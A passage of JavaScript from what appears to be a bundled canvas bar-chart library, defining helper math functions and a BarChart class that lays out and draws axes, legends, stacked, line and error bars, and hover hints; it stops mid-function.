/* >>> chartjs (1488 bytes) <<< */
(function(){
try{
/*global module:true*/
'use strict';

Math.log2 = Math.log2 || function(x) {
  return Math.log(x) / Math.LN2;
};

Math.log10 = Math.log10 || function(x) {
  return Math.log(x) / Math.LN10;
};

(function() {
  var Helpers = {
    avg: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        v += arr[index];
      }
      return v / arr.length;
    },
    min: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0];
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 < v) v = v2;
      }
      return Math.max(0, v);
    },
    max: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    upperMax: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.max(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    lowerMin: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0] || Infinity;
      if (Array.isArray(v)) v = Helpers.lowerMin(v);
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (v2 == null) continue;
        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
        if (v2 < v) v = v2;
      }
      if (isNaN(v) || !isFinite(v)) v = 0;
      return Math.max(0, v);
    },
    niceNumbers: function(range, round) {
      var exponent = Math.floor(Math.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;
      if (round) {
        if (fraction < 1.5) niceFraction = 1;
        else if (fraction < 3) niceFraction = 2;
        else if (fraction < 7) niceFraction = 5;
        else niceFraction = 10;
      } else {
        if (fraction <= 1.0) niceFraction = 1;
        else if (fraction <= 2) niceFraction = 2;
        else if (fraction <= 5) niceFraction = 5;
        else niceFraction = 10;
      }
      return niceFraction * Math.pow(10, exponent);
    },
    getLinearTicks: function(min, max, maxTicks) {
      var range = Helpers.niceNumbers(max - min, false);
      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
      return [
        Math.floor(min / tickSpacing) * tickSpacing,
        Math.ceil(max / tickSpacing) * tickSpacing,
        tickSpacing
      ];
    },
    getFont: function(options) {
      options.style = options.style || 'normal';
      options.variant = options.variant || 'normal';
      options.weight = options.weight || 'lighter';
      options.size = options.size || '12';
      options.family = options.family || 'Arial';
      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
    },
    getAxisRatio: function(min, max, value) {
      return (value - min) / (max - min);
    }
  };

  var BarChart = (function() {
    function BarChart(ctx, options) {
      this.mouseListeners = [];
      this.currentHint = null;
      this.fillRegions = []
      this.options = {
        font: 'Helvetica',
        fontWeight: 'normal',
        fontSizeTitle: 24,
        fontSizeAxes: 20,
        fontSizeTicks: 18,
        fontSizeLabels: 18,
        fontDataTags: 18,
        fontSizeLegend: 18,
        fontSizeHint: 18,
        paddingPercentBars: 0.10,
        paddingPercentTicks: 0.15,
        paddingPixelsVertical: 10,
        paddingPixelsHorizontal: 10,
        paddingPixelsTicks: 10,
        maxWidthBars: 0,
        fillColorBackground: 'rgb(255, 255, 255)',
        strokeColorBars: 'rgb(0, 0, 0)',
        fillColorBars: 'rgba(180, 180, 180, 0.25)',
        scaleStyle: 'linear',
        barStyle: 'none',
        stackedBarPadding: 3,
        defaultMaxTick: 0,
        pixelsLegendSquare: 10,
        radiusDot: 5,
        fillColorLegend: 'rgb(230, 230, 230)',
        tickFormatter: null,
        tickFormatterMeasure: null,
        fillRegion: 'normal'
      };
      options = options || { };
      for (var key in this.options) {
        if (options.hasOwnProperty(key)) this.options[key] = options[key];
      }
      this.ctx = ctx;
      this.content = { };
      this.labelPositions = { }
    }

    BarChart.prototype.update = function(content) {
      if (typeof content !== 'object') {
        throw new Error('Collections must be objects.');
      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
        throw new Error('Collection must specify labels and data.');
      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
        throw new Error('Labels and data must be arrays.');
      } else if (content.labels.length !== content.data.length) {
        throw new Error('Labels and data length must match.');
      }
      content._data_standard_deviation = [];
      content._data_standard_error = [];
      for (var i = 0; i < content.data.length; ++i) {
        var isArr = Array.isArray(content.data[i]);
        if (this.options.scaleStyle === 'log2') {
          if (isArr) {
            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
          } else content.data[i] = Math.log2(content.data[i]);
        }
        if (isArr) {
          var mean = Helpers.avg(content.data[i]);
          var acc = 0;
          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
          acc = Math.sqrt(acc / (content.data[i].length - 1));
          content._data_standard_deviation.push(acc);
          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
        } else {
          content._data_standard_deviation.push(0);
          content._data_standard_error.push(0);
        }
      }
      this.content = content;
      this.redraw();
    };

    BarChart.prototype.redraw = function() {
      setTimeout(function() {
        this._draw();
      }.bind(this), 0);
    };

    BarChart.prototype.mousemove = function(x, y) {
      var res = null;
      for (var index = 0; index < this.mouseListeners.length; ++index) {
        if ((res = this.mouseListeners[index](x, y))) break;
      }
      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
        if (this.currentHint !== null) {
          this.currentHint = null;
          this.redraw();
        }
        return;
      }
      var ch = this.currentHint;
      if (ch == null || ch.index != res.index || ch.drawIndex != res.drawIndex) {
        this.currentHint = res;
        this.redraw();
      }
    };

    BarChart.prototype._draw = function() {
      var labelPositions = { }
      this.mouseListeners = [];
      this.fillRegions = [];

      var options = this.options;
      var ctx = this.ctx, content = this.content;
      var width = ctx.canvas.width, height = ctx.canvas.height;
      ctx.clearRect(0, 0, width, height);
      ctx.translate(-0.5, -0.5);
      var remainingWidth = width, remainingHeight = height;
      var index;

      if (options.fillColorBackground != null) {
        ctx.save();
        ctx.fillStyle = options.fillColorBackground;
        ctx.fillRect(0, 0, width, height);
        ctx.restore();
      }

      var topYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      ctx.fillStyle = 'rgb(0, 0, 0)';
      /* Draw title of bar chart */
      if (content.title != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTitle, family: options.font });
        ctx.textAlign = 'center';
        ctx.fillText(content.title, width / 2, topYPadding + options.fontSizeTitle);
        ctx.restore();
        remainingHeight -= options.fontSizeTitle * 1.25;
        topYPadding += options.fontSizeTitle * 1.25;
      }

      /* Compute required left padding */
      var leftXPadding = options.paddingPixelsVertical;
      remainingWidth  -= options.paddingPixelsVertical;

      var leftXDrawYLabel = null;
      if (content.yAxis != null) {
        leftXDrawYLabel = leftXPadding + options.fontSizeAxes * 0.5;
        remainingWidth -= options.fontSizeAxes * 1.25;
        leftXPadding += options.fontSizeAxes * 1.25;
      }

      ctx.save();
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      var maxChartValue, minChartValue;
      if (options.barStyle === 'stacked') {
        maxChartValue = 0;
        minChartValue = Infinity;
        for (var cmIndex = 0; cmIndex < content.data.length; ++cmIndex) {
          var doB;
          if (Array.isArray(doB = content.data[cmIndex])) {
            var tempSum = 0;
            for (var ii2 = 0; ii2 < doB.length; ++ii2) tempSum += doB[ii2];
            maxChartValue = Math.max(maxChartValue, tempSum);
            minChartValue = Math.min(minChartValue, tempSum);
          } else {
            maxChartValue = Math.max(maxChartValue, content.data[cmIndex]);
            minChartValue = Math.min(minChartValue, content.data[cmIndex]);
          }
        }
      } else {
        maxChartValue = Helpers.upperMax(content.data);
        minChartValue = Helpers.lowerMin(content.data);
      }
      if (options.scaleStyle.indexOf('adaptive') === 0) {
        if (options.scaleStyle.indexOf(':') !== -1) {
          var floater = parseFloat(options.scaleStyle.split(/[:]/)[1]);
          minChartValue *= floater;
          maxChartValue *= 1 + (1 - floater) / 2.0;
        }
      } else minChartValue = 0;
      if (options.defaultMaxTick > maxChartValue) maxChartValue = options.defaultMaxTick;
      if (content.bars != null && Array.isArray(content.bars)) {
        for (index = 0; index < content.bars.length; ++index) {
          var cbv = content.bars[index].value;
          if (isNaN(cbv)) continue;
          maxChartValue = Math.max(maxChartValue, cbv);
          minChartValue = Math.min(minChartValue, cbv);
        }
      }
      var maxYAxisTickWidth = options.scaleStyle == 'log2' ? Math.ceil(Math.pow(2, maxChartValue)) : (Math.ceil(maxChartValue) + '.00');
      if (options.tickFormatterMeasure != null) maxYAxisTickWidth = options.tickFormatterMeasure;
      maxYAxisTickWidth = ctx.measureText(maxYAxisTickWidth).width;
      maxYAxisTickWidth = Math.ceil(maxYAxisTickWidth) + options.paddingPixelsTicks;
      remainingWidth -= maxYAxisTickWidth;
      leftXPadding += maxYAxisTickWidth;
      ctx.restore();

      var rightXPadding = options.paddingPixelsVertical;
      remainingWidth -= options.paddingPixelsVertical;

      /* Draw legend */
      if (content.legend != null && Array.isArray(content.legend)) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLegend, family: options.font });
        var maxLWidth = 0;
        for (var lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          maxLWidth = Math.max(maxLWidth, ctx.measureText(content.legend[lIndex].label).width);
        }
        maxLWidth = Math.ceil(maxLWidth);
        maxLWidth += options.pixelsLegendSquare + 8;
        var legendEntriesPerLine = Math.floor((remainingWidth - options.paddingPixelsHorizontal * 2) / maxLWidth);
        var lLReqHeight = Math.ceil(content.legend.length / legendEntriesPerLine) * options.fontSizeLegend * 1.5;
        remainingHeight -= lLReqHeight;
        bottomYPadding += lLReqHeight;

        ctx.strokeStyle = 'rgb(0, 0, 0)';
        ctx.fillStyle = options.fillColorLegend;
        var bSX, bSY;
        ctx.beginPath();
        ctx.moveTo(bSX = leftXPadding, bSY = topYPadding + remainingHeight);
        ctx.lineTo(bSX + remainingWidth, bSY);
        ctx.lineTo(bSX + remainingWidth, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY + lLReqHeight);
        ctx.lineTo(bSX, bSY);
        ctx.stroke();
        ctx.fill();

        for (lIndex = 0; lIndex < content.legend.length; ++lIndex) {
          var legLine = Math.floor(lIndex / legendEntriesPerLine);
          var legCol = lIndex % legendEntriesPerLine;
          ctx.fillStyle = content.legend[lIndex].color;
          var boxX = bSX + legCol * maxLWidth + 3, boxY = bSY + legLine * options.fontSizeLegend * 1.5 + options.fontSizeLegend * 0.5;
          ctx.beginPath();
          ctx.moveTo(boxX, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY);
          ctx.lineTo(boxX + options.pixelsLegendSquare, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY + options.pixelsLegendSquare);
          ctx.lineTo(boxX, boxY);
          ctx.fill();
          ctx.stroke();

          ctx.textAlign = 'left';
          ctx.fillStyle = 'rgb(0, 0, 0)';
          ctx.fillText(content.legend[lIndex].label, boxX + 3 + options.pixelsLegendSquare, boxY + options.fontSizeLegend * 0.5);
        }

        ctx.restore();
      }

      /* Draw x-axis label of bar chart */
      var bottomYPadding = options.paddingPixelsHorizontal;
      remainingHeight -= options.paddingPixelsHorizontal;
      if (content.xAxis != null) {
        ctx.save();
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.xAxis, (width - remainingWidth) + remainingWidth / 2, topYPadding + remainingHeight - bottomYPadding);
        remainingHeight -= options.fontSizeAxes * 1.5;
        bottomYPadding += options.fontSizeAxes * 1.5;
        ctx.restore();
      }

      var widthPerBar = remainingWidth / content.data.length;

      /* Draw x-axis top labels */
      if (content.topLabels != null) {
        ctx.save();
        ctx.textAlign = 'center';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        remainingHeight -= options.fontSizeLabels * 1.5;
        topYPadding += options.fontSizeLabels * 1.5;
        for (index = 0; index < content.topLabels.length; ++index) {
          ctx.fillText(
            content.topLabels[index],
            leftXPadding + index * widthPerBar + widthPerBar / 2,
            topYPadding - options.fontSizeLabels / 2
          );
        }
        ctx.restore();
      }

      /* Draw x-axis labels */
      ctx.save();
      var reqWidth = 0;
      if (content.dataTags != null) {
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
        var dataTags = content.dataTags;
        for (index = 0; index < dataTags.length; ++index) {
          if (Array.isArray(dataTags[index])) {
            for (var index2 = 0; index2 < dataTags[index].length; ++index2) {
              reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index][index2]).width + 5));
            }
          } else {
            reqWidth = Math.max(reqWidth, Math.ceil(ctx.measureText(dataTags[index]).width + 5));
          }
        }
      }

      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
      var computedBarPadding = Math.floor((widthPerBar * options.paddingPercentBars) / 2);
      var wwh = widthPerBar - computedBarPadding * 2;
      if (wwh < reqWidth) {
        computedBarPadding -= Math.ceil((reqWidth - wwh) / 2);
        computedBarPadding = Math.max(0, computedBarPadding);
      } else if (options.maxWidthBars > 0 && wwh > options.maxWidthBars) {
        computedBarPadding = Math.floor((widthPerBar - options.maxWidthBars) / 2);
      }
      var maxTextWidth = 0, maxTextStackSize = 1;
      for (index = 0; index < content.labels.length; ++index) {
        var tLabel = content.labels[index];
        if (Array.isArray(tLabel)) {
          maxTextStackSize = Math.max(maxTextStackSize, tLabel.length);
          for (index2 = 0; index2 < tLabel.length; ++index2) {
            maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel[index2]).width);
          }
        } else maxTextWidth = Math.max(maxTextWidth, ctx.measureText(tLabel).width);
      }
      var xLabelsRotated = false;
      if (maxTextWidth > widthPerBar - computedBarPadding) {
        ctx.textAlign = 'right';
        ctx.rotate(Math.PI * 1.5);
        xLabelsRotated = true;
      } else {
        ctx.textAlign = 'center';
      }
      var lastLabelY = -options.fontSizeLabels;
      for (index = 0; index < content.labels.length; ++index) {
        var cLabel = content.labels[index];
        var x = leftXPadding + index * widthPerBar + widthPerBar / 2, y = topYPadding + remainingHeight - options.fontSizeLabels / 2;
        if (xLabelsRotated) {
          y = topYPadding + remainingHeight - maxTextWidth + 5;
          y = [x, x = -y][0];

          if (y < lastLabelY + options.fontSizeLabels) continue;
          lastLabelY = y;
        }
        var yUp = options.fontSizeLabels * (maxTextStackSize - 1);
        if (Array.isArray(cLabel)) {
          if (xLabelsRotated) {
            yUp = options.fontSizeLabels * (cLabel.length - 1.5);
            yUp /= 2;
          }
          for (index2 = 0; index2 < cLabel.length; ++index2) {
            ctx.fillText(cLabel[index2], x, y - yUp);
            yUp -= options.fontSizeLabels;
          }
        } else {
          if (xLabelsRotated) yUp = -options.fontSizeLabels * 0.25;
          ctx.fillText(cLabel, x, y - yUp);
        }
      }
      if (xLabelsRotated) {
        remainingHeight -= maxTextWidth + 5;
        bottomYPadding += maxTextWidth + 5;
      } else {
        var remVal = options.fontSizeLabels * maxTextStackSize;
        remVal += options.fontSizeLabels * 0.5;
        remainingHeight -= remVal;
        bottomYPadding += remVal;
      }
      ctx.restore();

      /* Draw boundaries */
      var boundX1 = leftXPadding, boundX2 = leftXPadding + remainingWidth;
      var boundY1 = topYPadding, boundY2 = topYPadding + remainingHeight;

      for (index = 0; index < content.labels.length; ++index) labelPositions[index] = {
        xStart: leftXPadding + index * widthPerBar,
        xEnd: leftXPadding + (1 + index) * widthPerBar,
        yStart: boundY1, yEnd: boundY2
      }

      ctx.save();
      ctx.strokeStyle = 'rgb(0, 0, 0)';
      ctx.beginPath();
      if (content.topLabels != null) {
        ctx.moveTo(boundX2, boundY1);
        ctx.lineTo(boundX1, boundY1);
      } else {
        ctx.moveTo(boundX1, boundY1);
      }
      ctx.lineTo(boundX1, boundY2);
      ctx.lineTo(boundX2, boundY2);
      if (content.topLabels != null) ctx.lineTo(leftXPadding + remainingWidth, topYPadding);
      ctx.stroke();
      ctx.restore();

      /* Draw top label */
      if (content.topLabel != null) {
        ctx.save();
        ctx.textAlign = 'right';
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
        ctx.fillText(content.topLabel, leftXPadding - 3, topYPadding - options.fontSizeLabels / 2);
        ctx.restore();
      }

      /* Draw y-axis label of bar chart */
      if (content.yAxis != null) {
        ctx.save();
        ctx.rotate(Math.PI * 1.5);
        ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeAxes, family: options.font });
        ctx.fillStyle = 'rgb(0, 0, 0)';
        ctx.textAlign = 'center';
        ctx.fillText(content.yAxis, -(topYPadding + remainingHeight / 2), leftXDrawYLabel);
        ctx.restore();
      }

      /* Draw y-axis labels */
      ctx.save();
      ctx.fillStyle = 'rgb(0, 0, 0)';
      ctx.strokeStyle = 'rgba(0, 0, 0, 0.20)';
      ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeTicks, family: options.font });
      ctx.textAlign = 'right';
      var tickMeta = Helpers.getLinearTicks(0, maxChartValue, Math.max(2, remainingHeight / (options.fontSizeTicks * (1 + options.paddingPercentTicks))));
      var alpha = maxChartValue / options.fontSizeTicks;
      maxChartValue = tickMeta[1];
      if (maxChartValue > 1) maxChartValue += Math.ceil(alpha);
      else maxChartValue += alpha;
      var ticks = [];
      while (tickMeta[0] <= tickMeta[1]) {
        ticks.push(tickMeta[0]);
        tickMeta[0] += tickMeta[2];
      }
      for (index = 0; index < ticks.length; ++index) {
        var tickHeight = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, ticks[index]));
        if (tickHeight < 0) continue;
        if (options.scaleStyle == 'log2' && ticks[index] !== 0) ticks[index] = Math.round(Math.pow(2, ticks[index]));
        else ticks[index] = Math.floor(ticks[index] * 100) / 100;
        if (options.tickFormatter != null && typeof options.tickFormatter === 'function') {
          ctx.fillText(options.tickFormatter(ticks[index]).toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        } else {
          ctx.fillText(ticks[index].toString(), leftXPadding - options.paddingPixelsTicks, topYPadding + remainingHeight - tickHeight);
        }
        if (index == 0) continue;
        ctx.beginPath();
        ctx.moveTo(leftXPadding, topYPadding + remainingHeight - tickHeight);
        ctx.lineTo(leftXPadding + remainingWidth, topYPadding + remainingHeight - tickHeight);
        ctx.stroke();
      }
      ctx.restore();

      if (content.bars != null && Array.isArray(content.bars)) {
        ctx.save();
        for (index = 0; index < content.bars.length; ++index) {
          var cBar = content.bars[index];
          if (cBar.value > maxChartValue) continue;
          var renderBarY = topYPadding + remainingHeight - Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, cBar.value));
          ctx.strokeStyle = cBar.style;
          ctx.fillStyle = cBar.style;
          ctx.beginPath();
          ctx.moveTo(boundX1, renderBarY);
          ctx.lineTo(boundX2, renderBarY);
          ctx.stroke();
          ctx.fill();
        }
        ctx.restore();
      }

      /* Draw bars */
      ctx.save();
      var lastData = null;
      for (index = 0; index < content.data.length; ++index) {
        var fillColorForIndex = null;
        var strokeColorForIndex = null;
        if (content.fillColor != null) {
          if (Array.isArray(content.fillColor)) fillColorForIndex = ctx.fillStyle = content.fillColor[index];
          else ctx.fillStyle = content.fillColor;
        } else ctx.fillStyle = options.fillColorBars;
        if (content.strokeColor != null) {
          if (Array.isArray(content.strokeColor)) strokeColorForIndex = ctx.strokeStyle = content.strokeColor[index];
          else ctx.strokeStyle = content.strokeColor;
        } else ctx.strokeStyle = options.strokeColorBars;
        var v = content.data[index];
        var vIsArr = Array.isArray(v);
        var renderStartX = leftXPadding + widthPerBar * index;
        if (vIsArr && options.barStyle === 'stacked') {
          var runningValue = 0, lastHeight = 0;
          for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
            if (fillColorForIndex != null && Array.isArray(fillColorForIndex)) {
              ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
            }
            if (strokeColorForIndex != null && Array.isArray(strokeColorForIndex)) {
              ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
            }

            runningValue += v[drawIndex];
            var renderBarHeight = Math.floor(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, runningValue));
            var renderUpToY = topYPadding + remainingHeight - renderBarHeight;
            if (Math.abs(renderBarHeight - lastHeight) < options.stackedBarPadding + 2) {
              lastHeight = renderBarHeight;
              continue;
            }

            var barPadP = drawIndex > 0 ? options.stackedBarPadding : 0;
            var tSX, tSY;
            var tEX, tEY;
            ctx.beginPath();
            ctx.moveTo(tSX = renderStartX + computedBarPadding, tSY = topYPadding + remainingHeight - lastHeight - barPadP);
            ctx.lineTo(renderStartX + computedBarPadding, renderUpToY);
            ctx.lineTo(tEX = renderStartX + (widthPerBar - 1) - computedBarPadding, tEY = renderUpToY);
            ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight - lastHeight - barPadP);
            if (drawIndex > 0) ctx.lineTo(tSX, tSY);
            ctx.stroke();
            ctx.fill();
            var hint;
            if (content.hints != null && content.hints[index] != null && (hint = content.hints[index][drawIndex]) != null) {
              this.mouseListeners.push(function(index, drawIndex, hint, sx, sy, ex, ey, x, y) {
                var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
                var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
                if (x < minX || x > maxX || y < minY || y > maxY) return null;
                return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
              }.bind(this, index, drawIndex, hint, tSX, tSY, tEX, tEY));
            }

            var tagText;
            if (tSY - renderUpToY > options.fontDataTags * 1.25 && content.dataTags != null && (tagText = content.dataTags[index]) != null && (tagText = tagText[drawIndex]) != null) {
              var oFS = ctx.fillStyle;
              ctx.fillStyle = 'rgb(0, 0, 0)';
              ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontDataTags, family: options.font });
              ctx.textAlign = 'center';
              ctx.fillText(tagText, renderStartX + widthPerBar / 2, tSY - options.fontDataTags * 0.25);
              ctx.fillStyle = oFS;
            }

            lastHeight = renderBarHeight;
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY - 3);
          }
        } else if (options.barStyle === 'line') {
          if (vIsArr) {
            var rbx = renderStartX + widthPerBar / 2;

            var lDu;
            if (options.fillRegion === 'background') {
              lDu = lastData;
              if (Array.isArray(lDu)) lDu = lDu[0];
              if (lDu != null) {
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }

            var nLData = [];
            for (var drawIndex = 0; drawIndex < v.length; ++drawIndex) {
              var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v[drawIndex]));
              var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

              var rby = renderUpToY3;
              if (lastData != null) {
                var tLX, tLY;
                if (Array.isArray(lastData)) {
                  tLX = (lastData[drawIndex] || { }).x;
                  tLY = (lastData[drawIndex] || { }).y;
                } else {
                  tLX = lastData.x;
                  tLY = lastData.y;
                }

                if (tLX && tLY) {
                  if (Array.isArray(strokeColorForIndex)) {
                    ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
                  } else ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }

              if (Array.isArray(fillColorForIndex)) {
                ctx.fillStyle = fillColorForIndex[drawIndex] || options.fillColorBars;
              }
              if (Array.isArray(strokeColorForIndex)) {
                ctx.strokeStyle = strokeColorForIndex[drawIndex] || options.strokeColorBars;
              }

              ctx.beginPath();
              ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
              ctx.stroke();
              ctx.fill();

              nLData[drawIndex] = { x: rbx, y: rby, color: ctx.fillStyle };
            }
            lastData = nLData;
            if (lDu != null && lDu.color != lastData[0].color) this.fillRegions.push({
              x: lastData[0].x,
              y: lastData[0].y,
              prev: lDu.color,
              next: lastData[0].color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          } else {
            var renderBarHeight3 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
            var renderUpToY3 = topYPadding + remainingHeight - renderBarHeight3;

            var rbx = renderStartX + widthPerBar / 2, rby = renderUpToY3;
            var lDu;
            if (options.fillRegion === 'background') {
              if (lastData != null) {
                lDu = lastData;
                if (Array.isArray(lDu)) lDu = lDu[0];
                var sFS = ctx.fillStyle
                ctx.fillStyle = lDu.color
                ctx.fillRect(lDu.x, boundY1, rbx - lDu.x, boundY2 - boundY1)
                ctx.fillStyle = sFS
              }
            }
            ctx.beginPath();
            ctx.arc(rbx, rby, options.radiusDot, 0, 2 * Math.PI);
            ctx.stroke();
            ctx.fill();

            if (lastData != null) {
              if (Array.isArray(lastData)) {
                var tLX, tLY;
                for (var key in lastData) {
                  if (!lastData.hasOwnProperty(key)) continue;
                  tLX = lastData[key].x;
                  tLY = lastData[key].y;
                  if (tLX && tLY) {
                    ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                    ctx.beginPath();
                    ctx.moveTo(tLX, tLY);
                    ctx.lineTo(rbx, rby);
                    ctx.stroke();
                  }
                }
              } else {
                var tLX = lastData.x, tLY = lastData.y;
                if (tLX && tLY) {
                  ctx.strokeStyle = strokeColorForIndex || 'rgb(0, 0, 0)';
                  ctx.beginPath();
                  ctx.moveTo(tLX, tLY);
                  ctx.lineTo(rbx, rby);
                  ctx.stroke();
                }
              }
            }

            lastData = { x: rbx, y: rby, color: ctx.fillStyle };
            if (lDu != null && lDu.color != lastData.color) this.fillRegions.push({
              x: lastData.x,
              y: lastData.y,
              prev: lDu.color,
              next: lastData.color
            })

            if (content.balls != null && Array.isArray(content.balls) && index < content.balls.length) {
              var ball = content.balls[index]
              if (ball != null) {
                ctx.beginPath();
                ctx.fillStyle = ball.fill;
                ctx.strokeStyle = ball.stroke;
                ctx.arc(rbx, topYPadding + remainingHeight - (remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, minChartValue + ball.value)), ball.radius, 0, 2 * Math.PI);
                ctx.stroke();
                ctx.fill();
              }
            }
          }

          var hint;
          if (content.hints != null && (hint = content.hints[index]) != null) {
            this.mouseListeners.push(function(index, hint, sx, sy, ex, ey, x, y) {
              var minX = Math.min(sx, ex), maxX = Math.max(sx, ex);
              var minY = Math.min(sy, ey), maxY = Math.max(sy, ey);
              if (x < minX || x > maxX || y < minY || y > maxY) return null;
              return { index: index, drawIndex: drawIndex, rect: { left: minX, right: maxX, top: minY, bottom: maxY }, text: hint.split('\n') };
            }.bind(this, index, hint, rbx - 1, topYPadding, rbx + 1, topYPadding + remainingHeight));
          }
        } else {
          if (vIsArr) v = Helpers.avg(v);
          var renderBarHeight2 = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, v));
          var renderUpToY2 = topYPadding + remainingHeight - renderBarHeight2;
          ctx.beginPath();
          ctx.moveTo(renderStartX + computedBarPadding, topYPadding + remainingHeight);
          ctx.lineTo(renderStartX + computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, renderUpToY2);
          ctx.lineTo(renderStartX + (widthPerBar - 1) - computedBarPadding, topYPadding + remainingHeight);
          ctx.stroke();
          ctx.fill();

          if (options.barStyle === 'error') {
            var val;
            if ((val = content._data_standard_error[index]) != 0) {
              var renderBarError = Math.round(remainingHeight * Helpers.getAxisRatio(minChartValue, maxChartValue, val));
              ctx.beginPath();
              var wiskerWidth = Math.round((widthPerBar - computedBarPadding * 2) / 8);
              var x_ = leftXPadding + widthPerBar * index + widthPerBar / 2;
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 + renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 + renderBarError);
              ctx.moveTo(x_, renderUpToY2 + renderBarError);
              ctx.lineTo(x_, renderUpToY2 - renderBarError);
              ctx.moveTo(x_ - wiskerWidth, renderUpToY2 - renderBarError);
              ctx.lineTo(x_ + wiskerWidth, renderUpToY2 - renderBarError);
              ctx.stroke();
            }
          }

          if (content.barTooltips != null) {
            ctx.fillStyle = 'rgb(0, 0, 0)';
            ctx.font = Helpers.getFont({ weight: options.fontWeight, size: options.fontSizeLabels, family: options.font });
            ctx.textAlign = 'center';
            ctx.fillText(content.barTooltips[index] || '', renderStartX + widthPerBar / 2, renderUpToY2 - 3);
          }
        }
      }
      ctx.restore();

      if (this.currentHint != null) {
        ctx.save();
